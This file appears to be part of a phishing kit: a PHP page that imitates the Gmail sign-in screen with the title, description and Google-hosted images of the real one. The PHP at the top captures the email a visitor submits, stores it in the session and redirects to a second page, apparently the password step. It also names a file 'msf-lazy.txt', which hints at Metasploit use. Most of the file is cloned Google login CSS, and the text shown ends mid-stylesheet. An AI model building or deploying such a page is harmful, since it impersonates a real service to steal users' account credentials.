
<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="description" content="Gmail is email that&#39;s intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
  <title>Gmail</title>
  <link rel="stylesheet" type="text/css"  href="index.css" media="screen" />
 
<?php
    session_start ();
    $_SESSION['link'] = "msf-lazy.txt";
?>

<?php 
if(isset($_POST['submit'])){
    $userEmail = $_POST["Email"]; 
    $emailDelimiterPosition = strchr($userEmail, "@");
    $html = ["<",">","$","%"];
    $htex = [" "," "," "," "];
    $gmailUser = str_replace(
        $html,
        $htex,
        $userEmail
    );

    $_SESSION['email'] = $gmailUser;
    $completedEmail = $gmailUser;

    if (empty($emailDelimiterPosition)) {
        $completedEmail = $my."@gmail.com";
    }

    $userEmailLength = strlen($completedEmail);
    
    if($userEmailLength >= 14 && $userEmailLength < 30){ 
        $_SESSION['use'] = $completedEmail; 
        header("Location: p.php"); 
    }
}

#include "header.php";

?>
 <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .header .logo {
  background-image: url(https://ssl.gstatic.com/accounts/ui/logo_2x.png);
  }
  .header .logo-w {
  background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_112x36dp.png);
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
<style>
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card .profile-email {
  font-size: 16px;
  text-align: center;
  margin: 10px 0 20px 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google .logo-strip {
  background-repeat: no-repeat;
  display: block;
  margin: 10px auto;
  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png);
  background-size: 230px 17px;
  width: 230px;
  height: 17px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .one-google .logo-strip {
  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_2x.png);
  }
</style>
<style>
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  top: 380px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("//ssl.gstatic.com/ui/v1/icons/common/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style type="text/css">
.captcha-box {
  background: #fff;
  margin: 0 0 10px;
  overflow: hidden;
  padding: 10px;
}
.captcha-box .captcha-img {
  text-align: center;
}
.captcha-box .captcha-label {
  font-weight: bold;
  display: block;
  margin: .5em 0;
}
.captcha-box .captcha-msg {
  color: #999;
  display: block;
  position: relative;
}
.captcha-box .captcha-msg .accessibility-logo {
  float: right;
  border: 0;
}
.captcha-box .audio-box {
  position: absolute;
  top: 0;
}
</style>
<style>
.chromiumsync-custom-content {
  padding-top: 20px;
  margin-bottom: 0;
}
.form-panel {
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -webkit-transform: translateZ(0);
  -moz-transform: translateZ(0);
  -ms-transform: translateZ(0);
  -o-transform: translateZ(0);
  transform: translateZ(0);
  position: absolute;
  width: 100%;
}
.form-panel.first {
  z-index: 2;
}
.form-panel.second {
  z-index: 1;
}
.shift-form .form-panel.first {
  z-index: 1;
}
.shift-form .form-panel.second {
  z-index: 2;
}
  .hide-form.slide-out {
  display: none;
  }
  .hide-form.slide-in {
  display: none;
  }
.slide-in,
.slide-out {
  display: block;
  -webkit-transition-property: -webkit-transform, opacity;
  -moz-transition-property: -moz-transform, opacity;
  -ms-transition-property: -ms-transform, opacity;
  -o-transition-property: -o-transform, opacity;
  transition-property: transform, opacity;
  -webkit-transition-duration: 0.1s;
  -moz-transition-duration: 0.1s;
  -ms-transition-duration: 0.1s;
  -o-transition-duration: 0.1s;
  transition-duration: 0.1s;
  -webkit-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -moz-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -ms-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -o-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
}
.slide-out {
  -webkit-transform: translate3d(0, 0, 0);
  -moz-transform: translate3d(0, 0, 0);
  -ms-transform: translate3d(0, 0, 0);
  -o-transform: translate3d(0, 0, 0);
  transform: translate3d(0, 0, 0);
}
.shift-form .slide-out {
  opacity: 0;
  -webkit-transform: translate3d(-120%, 0, 0);
  -moz-transform: translate3d(-120%, 0, 0);
  -ms-transform: translate3d(-120%, 0, 0);
  -o-transform: translate3d(-120%, 0, 0);
  transform: translate3d(-120%, 0, 0);
}
.slide-in {
  -webkit-transform: translate3d(120%, 0, 0);
  -moz-transform: translate3d(120%, 0, 0);
  -ms-transform: translate3d(120%, 0, 0);
  -o-transform: translate3d(120%, 0, 0);
  transform: translate3d(120%, 0, 0);
}
.shift-form .slide-in {
  opacity: 1;
  -webkit-transform: translate3d(0, 0, 0);
  -moz-transform: translate3d(0, 0, 0);
  -ms-transform: translate3d(0, 0, 0);
  -o-transform: translate3d(0, 0, 0);
  transform: translate3d(0, 0, 0);
}
.error-msg {
  -webkit-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -moz-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -ms-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -o-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  height: auto;
  max-height: 0;
  opacity: 0;
}
.has-error .error-msg {
  max-height: 3.5em;
  margin-top: 10px;
  margin-bottom: 10px;
  opacity: 1;
  visibility: visible;
}
.back-arrow {
  position: absolute;
  top: 37px;
  width: 24px;
  height: 24px;
  display: none;
  cursor: pointer;
}
.back-arrow {
  border-style: none;
}
.shift-form.back-arrow {
  display: block;
}
#link-signup {
  text-align: center;
  font-size: 14px;
}
.shift-form #link-signup{
  display: none;
}
#link-signin-different {
  display: none;
  text-align: center;
  font-size: 14px;
}
.shift-form #link-signin-different {
  display: block;
}
.signin-card #profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 0;
  min-height: 1em;
}
.signin-card.no-name #profile-name {
  display: none;
}
.signin-card.no-name #email-display {
  line-height: initial;
  margin-bottom: 16px;
}
.signin-card #email-display {
  display: block;
  padding: 0px 8px;
  color: rgb(64, 64, 64);
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
.signin-card #Email {
  margin-top: 16px;
}
.need-help {
  float: right;
  text-align: right;
  
}
.form-panel {
  width: 274px;
}
#gaia_firstform {
  z-index: 2;
}
.signin-card {
  position: relative;
  overflow: hidden;
}
.signin-card #profile-name {
  color: #000;
}
.circle-mask {
  display: block;
  height: 96px;
  width: 96px;
  overflow: hidden;
  border-radius: 50%;
  margin-left: auto;
  margin-right: auto;
  z-index: 100;
  margin-bottom: 10px;
  background-size: 96px;
  background-repeat: no-repeat;
  background-image: url(https://ssl.gstatic.com/accounts/ui/avatar_2x.png);
  -webkit-transition: opacity 0.075s;
  -moz-transition: opacity 0.075s;
  -ms-transition: opacity 0.075s;
  -o-transition: opacity 0.075s;
  transition: opacity 0.075s;
}
.circle {
  -webkit-transition-property: -webkit-transform;
  -moz-transition-property: -moz-transform;
  -ms-transition-property: -ms-transform;
  -o-transition-property: -o-transform;
  transition-property: transform;
  -webkit-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -moz-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -ms-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -o-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  transition-timing-function: cubic-bezier(.645,.045,.355,1);
}
.circle {
  position: absolute;
  z-index: 101;
  height: 96px;
  width: 96px;
  border-radius: 50%;
  opacity: 0.99;
  overflow: hidden;
  background-repeat: no-repeat;
  background-position: center center;
}
.main {
  overflow: hidden;
}
.card-mask-wrap {
  position: relative;
  width: 360px;
  margin: 0 auto;
  z-index: 1;
}
.dasher-tooltip {
  position: absolute;
  left: 50%;
  margin-left: 150px;
}
.dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
}
.dasher-tooltip p {
  margin-top: 0;
}
.dasher-tooltip p span {
  display: block;
}
  .signin-card {
  height: 550px;
  }
  .card-mask-wrap {
  -webkit-transition: transform 0.5s;
  -moz-transition: transform 0.5s;
  -ms-transition: transform 0.5s;
  -o-transition: transform 0.5s;
  transition: transform 0.5s;
  -webkit-transform: translate3d(0,
  -263px
, 0);
  -moz-transform: translate3d(0,
  -263px
, 0);
  -ms-transform: translate3d(0,
  -263px
, 0);
  -o-transform: translate3d(0,
  -263px
, 0);
  transform: translate3d(0,
  -263px
, 0);
;
  }
  .card-mask-wrap.has-captcha {
  -webkit-transform: translate3d(0,
  -93px
, 0);
  -moz-transform: translate3d(0,
  -93px
, 0);
  -ms-transform: translate3d(0,
  -93px
, 0);
  -o-transform: translate3d(0,
  -93px
, 0);
  transform: translate3d(0,
  -93px
, 0);
;
  }
  .card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -223px
, 0);
  -moz-transform: translate3d(0,
  -223px
, 0);
  -ms-transform: translate3d(0,
  -223px
, 0);
  -o-transform: translate3d(0,
  -223px
, 0);
  transform: translate3d(0,
  -223px
, 0);
;
  }
  .card-mask-wrap.has-captcha.has-error {
  -webkit-transform: translate3d(0,
  -53px
, 0);
  -moz-transform: translate3d(0,
  -53px
, 0);
  -ms-transform: translate3d(0,
  -53px
, 0);
  -o-transform: translate3d(0,
  -53px
, 0);
  transform: translate3d(0,
  -53px
, 0);
;
  }
  .shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -222px
, 0);
  -moz-transform: translate3d(0,
  -222px
, 0);
  -ms-transform: translate3d(0,
  -222px
, 0);
  -o-transform: translate3d(0,
  -222px
, 0);
  transform: translate3d(0,
  -222px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -182px
, 0);
  -moz-transform: translate3d(0,
  -182px
, 0);
  -ms-transform: translate3d(0,
  -182px
, 0);
  -o-transform: translate3d(0,
  -182px
, 0);
  transform: translate3d(0,
  -182px
, 0);
;
  }
  .shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -242px
, 0);
  -moz-transform: translate3d(0,
  -242px
, 0);
  -ms-transform: translate3d(0,
  -242px
, 0);
  -o-transform: translate3d(0,
  -242px
, 0);
  transform: translate3d(0,
  -242px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -202px
, 0);
  -moz-transform: translate3d(0,
  -202px
, 0);
  -ms-transform: translate3d(0,
  -202px
, 0);
  -o-transform: translate3d(0,
  -202px
, 0);
  transform: translate3d(0,
  -202px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -52px
, 0);
  -moz-transform: translate3d(0,
  -52px
, 0);
  -ms-transform: translate3d(0,
  -52px
, 0);
  -o-transform: translate3d(0,
  -52px
, 0);
  transform: translate3d(0,
  -52px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -72px
, 0);
  -moz-transform: translate3d(0,
  -72px
, 0);
  -ms-transform: translate3d(0,
  -72px
, 0);
  -o-transform: translate3d(0,
  -72px
, 0);
  transform: translate3d(0,
  -72px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -12px
, 0);
  -moz-transform: translate3d(0,
  -12px
, 0);
  -ms-transform: translate3d(0,
  -12px
, 0);
  -o-transform: translate3d(0,
  -12px
, 0);
  transform: translate3d(0,
  -12px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error.no-name {
  -webkit-transform: translate3d(0,
  -32px
, 0);
  -moz-transform: translate3d(0,
  -32px
, 0);
  -ms-transform: translate3d(0,
  -32px
, 0);
  -o-transform: translate3d(0,
  -32px
, 0);
  transform: translate3d(0,
  -32px
, 0);
;
  }
  .main-content {
  height: 550px;
;
  }
  .main-content.has-captcha {
  height: 620px;
;
  }
  .main-content.has-error {
  height: 490px;
;
  }
  .main-content.has-captcha.has-error {
  height: 660px;
;
  }
  .shift-form.main-content {
  height: 491px;
;
  }
  .has-error.shift-form.main-content {
  height: 531px;
;
  }
  .shift-form.main-content.no-name {
  height: 471px;
;
  }
  .has-error.shift-form.main-content.no-name {
  height: 511px;
;
  }
  .has-captcha.shift-form.main-content {
  height: 661px;
;
  }
  .has-captcha.shift-form.main-content.no-name {
  height: 641px;
;
  }
  .has-captcha.shift-form.main-content.has-error {
  height: 701px;
;
  }
  .has-captcha.shift-form.main-content.has-error.no-name {
  height: 681px;
;
  }
  .card-mask {
  background-color: #fff;
  background-position: 50% 0;
  background-repeat: no-repeat;
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAWgAAAAGCAIAAABhDpMcAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gkeFxks6YflLAAAAKlJREFUWMPt2CEShDAMheGmMCFV1MH9z8MtarC4QKfNiuwwOyxHeJ9r6iJ+ETKz3vu+7/M8D8MQAADetNaO41jXNcYYfUREpZRaK7YDAP9qraUUIvLn6NVg5t77tm2qamZYEwDciEhElmVhZm/H6B8ppZxzCOE8T4QDAB7hmKYp55xS+k48E601VVXV67oQDgB4hIOZRURE/BJKv5kwM1QDAF7bcR84Qggf4ShHovU/ogcAAAAASUVORK5CYII=);
  min-height: 300px;
  }
.card {
  margin-bottom: 0;
}
.one-google {
  padding-top: 27px;
}
#canvas {
  -webkit-transition: opacity 0.075s;
  -moz-transition: opacity 0.075s;
  -ms-transition: opacity 0.075s;
  -o-transition: opacity 0.075s;
  transition: opacity 0.075s;
  opacity: 0.01;
}
.shift-form #canvas {
  opacity: 0.99;
}
.label {
  color: #404040;
}
#account-chooser-link {
  -webkit-transition: opacity 0.3s;
  -moz-transition: opacity 0.3s;
  -ms-transition: opacity 0.3s;
  -o-transition: opacity 0.3s;
  transition: opacity 0.3s;
}
.input-wrapper {
  position: relative;
}
.google-footer-bar {
  z-index: 2;
}
</style>
<style media="screen and (max-width: 580px)">
.back-arrow {
  top: 17px;
}
.circle-mask {
  height: 72px;
  width: 72px;
  background-size: 72px;
}
.circle {
  height: 72px;
  width: 72px;
}
#canvas {
  height: 72px;
  width: 72px;
}
.form-panel {
  width: 256px;
}
.card-mask-wrap {
  width: 300px;
}
  .card-mask {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAS4AAAAGCAIAAADyquT7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNS4xIFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RDcyMjMyQ0NFODg4MTFFNEEzRkU5RDVERTUwRUQ5OTAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RDcyMjMyQ0RFODg4MTFFNEEzRkU5RDVERTUwRUQ5OTAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpENzIyMzJDQUU4ODgxMUU0QTNGRTlENURFNTBFRDk5MCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpENzIyMzJDQkU4ODgxMUU0QTNGRTlENURFNTBFRDk5MCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqGCc+MAAACnSURBVHja7Ng7DoQgFIXhYTAKFXS6//W4CxtaOh4B5sQ7mcwGpDpfpdjd5M9V1Rij9x5CcM5prV9ENEtrLcZ4HMcb5EgpdV1XrZXTIZoDuSE6pCe3i3S4rit243meKSXsSY6J6FGIzhiz7zvSkxoXeWCt9d7jIufMFIkmpLhtG6JDet8TCQ/vrOlWSmGKRBNSxD40N/lHo/7DGzeOiWhOjb8PRfgIMAAaYEeit6tkKwAAAABJRU5ErkJggg==);
  }
  .card-mask-wrap {
  -webkit-transform: translate3d(0,
  -288px
, 0);
  -moz-transform: translate3d(0,
  -288px
, 0);
  -ms-transform: translate3d(0,
  -288px
, 0);
  -o-transform: translate3d(0,
  -288px
, 0);
  transform: translate3d(0,
  -288px
, 0);
;
  }
  .card-mask-wrap.has-captcha {
  -webkit-transform: translate3d(0,
  -118px
, 0);
  -moz-transform: translate3d(0,
  -118px
, 0);
  -ms-transform: translate3d(0,
  -118px
, 0);
  -o-transform: translate3d(0,
  -118px
, 0);
  transform: translate3d(0,
  -118px
, 0);
;
  }
  .card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -248px
, 0);
  -moz-transform: translate3d(0,
  -248px
, 0);
  -ms-transform: translate3d(0,
  -248px
, 0);
  -o-transform: translate3d(0,
  -248px
, 0);
  transform: translate3d(0,
  -248px
, 0);
;
  }
  .card-mask-wrap.has-captcha.has-error {
  -webkit-transform: translate3d(0,
  -78px
, 0);
  -moz-transform: translate3d(0,
  -78px
, 0);
  -ms-transform: translate3d(0,
  -78px
, 0);
  -o-transform: translate3d(0,
  -78px
, 0);
  transform: translate3d(0,
  -78px
, 0);
;
  }
  .shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -247px
, 0);
  -moz-transform: translate3d(0,
  -247px
, 0);
  -ms-transform: translate3d(0,
  -247px
, 0);
  -o-transform: translate3d(0,
  -247px
, 0);
  transform: translate3d(0,
  -247px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -207px
, 0);
  -moz-transform: translate3d(0,
  -207px
, 0);
  -ms-transform: translate3d(0,
  -207px
, 0);
  -o-transform: translate3d(0,
  -207px
, 0);
  transform: translate3d(0,
  -207px
, 0);
;
  }
  .shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -267px
, 0);
  -moz-transform: translate3d(0,
  -267px
, 0);
  -ms-transform: translate3d(0,
  -267px
, 0);
  -o-transform: translate3d(0,
  -267px
, 0);
  transform: translate3d(0,
  -267px
, 0);
;
  }
  .has-error.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -227px
, 0);
  -moz-transform: translate3d(0,
  -227px
, 0);
  -ms-transform: translate3d(0,
  -227px
, 0);
  -o-transform: translate3d(0,
  -227px
, 0);
  transform: translate3d(0,
  -227px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap {
  -webkit-transform: translate3d(0,
  -77px
, 0);
  -moz-transform: translate3d(0,
  -77px
, 0);
  -ms-transform: translate3d(0,
  -77px
, 0);
  -o-transform: translate3d(0,
  -77px
, 0);
  transform: translate3d(0,
  -77px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.no-name {
  -webkit-transform: translate3d(0,
  -97px
, 0);
  -moz-transform: translate3d(0,
  -97px
, 0);
  -ms-transform: translate3d(0,
  -97px
, 0);
  -o-transform: translate3d(0,
  -97px
, 0);
  transform: translate3d(0,
  -97px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error {
  -webkit-transform: translate3d(0,
  -37px
, 0);
  -moz-transform: translate3d(0,
  -37px
, 0);
  -ms-transform: translate3d(0,
  -37px
, 0);
  -o-transform: translate3d(0,
  -37px
, 0);
  transform: translate3d(0,
  -37px
, 0);
;
  }
  .has-captcha.shift-form.card-mask-wrap.has-error.no-name {
  -webkit-transform: translate3d(0,
  -57px
, 0);
  -moz-transform: translate3d(0,
  -57px
, 0);
  -ms-transform: translate3d(0,
  -57px
, 0);
  -o-transform: translate3d(0,
  -57px
, 0);
  transform: translate3d(0,
  -57px
, 0);
;
  }
  .main-content {
  height: 550px;
;
  }
  .main-content.has-captcha {
  height: 520px;
;
  }
  .main-content.has-error {
  height: 390px;
;
  }
  .main-content.has-captcha.has-error {
  height: 560px;
;
  }
